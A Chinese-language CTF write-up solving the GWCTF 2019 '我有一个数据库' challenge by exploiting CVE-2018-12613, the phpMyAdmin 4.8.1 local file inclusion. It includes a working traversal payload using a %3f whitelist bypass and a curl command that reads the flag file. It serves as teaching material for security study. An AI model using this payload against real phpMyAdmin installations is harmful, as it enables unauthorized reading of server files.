# [GWCTF 2019]我有一个数据库

## 题目概述
题目提示"我有一个数据库，但里面什么也没有"，暗示需要关注数据库管理工具而非数据库内容本身。

## 信息收集
1. 访问首页，页面显示"我有一个数据库，但里面什么也没有"
2. 检查 `robots.txt`，发现：
   ```
   User-agent: *
   Disallow: phpinfo.php
   ```
3. 访问 `/phpmyadmin/` 目录，发现 **phpMyAdmin 4.8.1** 版本

## 漏洞分析（漏洞类型、原理、判断过程）
**漏洞类型**：本地文件包含（LFI）

**漏洞原理**：phpMyAdmin 4.8.1 存在 CVE-2018-12613 漏洞，位于 `index.php` 的 `target` 参数。该参数本应限制为白名单内的页面，但由于：
1. 使用 `urldecode()` 对输入进行二次解码
2. 检查逻辑可通过 `?` 字符绕过（如 `db_sql.php?/../../../`）

攻击者可通过构造特殊 payload 绕过白名单检查，实现任意文件读取。

**判断过程**：
- 识别到 phpMyAdmin 4.8.1 版本
- 该版本存在已知的高危漏洞 CVE-2018-12613

## 利用过程（Payload + Flag）

**Payload**：
```
/phpmyadmin/index.php?target=db_sql.php%3f/../../../../../../../../flag
```

**Payload 解析**：
- `db_sql.php%3f`：`%3f` 是 `?` 的 URL 编码，绕过白名单检查
- `/../../../../../../../../flag`：目录穿越，从 phpMyAdmin 目录跳转到根目录读取 flag

**获取 Flag**：
```bash
curl -s "http://target/phpmyadmin/index.php?target=db_sql.php%3f/../../../../../../../../flag"
```

在返回的 HTML 中，`<div id="page_content">` 区域包含 flag：
```
flag{29e35992-1048-4a27-ba56-b8adf0bbca79}
```

## 复现步骤
1. 访问题目 URL
2. 发现 `/phpmyadmin/` 路径，确认版本为 4.8.1
3. 构造 LFI payload：`?target=db_sql.php%3f/../../../../../../../../flag`
4. 从响应中提取 flag

## 技术总结（表格：漏洞类型/攻击入口/核心Payload/知识点）

| 漏洞类型 | 攻击入口 | 核心 Payload | 知识点 |
|---------|---------|-------------|--------|
| LFI | target 参数 | `db_sql.php%3f/../../../../../../../../flag` | CVE-2018-12613、URL二次解码绕过 |

## 知识总结（解题技巧、同类题型套路）
1. **版本识别**：看到数据库相关题目，优先探测 phpMyAdmin、Adminer 等管理工具
2. **CVE 利用**：识别到具体版本后，搜索对应 CVE 漏洞
3. **绕过技巧**：phpMyAdmin LFI 绕过白名单的常用方法是使用 `?` 字符（`%3f` 编码），让白名单检查认为文件名以白名单页面开头
4. **flag 位置**：CTF 中 flag 常见位置包括 `/flag`、`/flag.txt`、`/home/xxx/flag` 等
